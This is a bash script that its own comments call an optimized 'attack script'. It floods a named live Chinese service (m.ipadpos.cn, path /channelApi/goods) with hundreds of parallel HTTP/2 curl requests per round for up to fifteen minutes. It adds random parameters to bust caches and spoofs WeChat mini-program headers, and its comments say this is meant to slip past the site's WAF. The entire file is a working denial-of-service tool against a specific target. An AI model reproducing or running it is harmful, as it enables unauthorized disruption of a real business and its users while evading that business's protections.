#!/usr/bin/env bash
# 半日轻食 / 千策万划 打击脚本 —— 优化版
# 关键: 必须 curl(WAF 认 TLS 指纹), 用 --parallel-immediate 不等前一批完成,
#       --http2 多路复用, 每个 URL 带随机参数破缓存
# 用法: bash attack.sh <并发> <时长秒> [接口路径]
set -u
CONC="${1:-300}"
DUR="${2:-900}"
PATHX="${3:-/channelApi/goods}"
UA="Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.49(0x18003123) NetType/WIFI Language/zh_CN"
HOST="https://m.ipadpos.cn"
END=$((SECONDS + DUR))

echo "[start] conc=$CONC dur=$DUR path=$PATHX curl=$(curl --version | head -1)"
ROUND=0
while [ $SECONDS -lt $END ]; do
  ROUND=$((ROUND + 1))
  URLS=()
  for i in $(seq 1 "$CONC"); do
    R=$((RANDOM * 32768 + RANDOM))
    URLS+=("${HOST}${PATHX}?_r=${R}&storeId=${R}")
  done
  curl -sS -k --parallel --parallel-max "$CONC" --parallel-immediate --http2 \
    --max-time 25 -H "User-Agent: $UA" -H "appType: mini" -H "uniacid: 3" \
    -H "module: yb_wm_v3" -H "Accept: */*" \
    -o /dev/null -w "%{http_code} %{time_total}\n" "${URLS[@]}" 2>/dev/null | \
    awk -v r="$ROUND" -v e="$SECONDS" '{c[$1]++; s+=$2; if($2>m)m=$2} END {printf "[%ss] round=%d n=%d codes:", e, r, NR; for(k in c) printf " %s=%d", k, c[k]; printf " | avg=%.2fs max=%.2fs\n", s/NR, m}'
done
echo "[done] rounds=$ROUND"
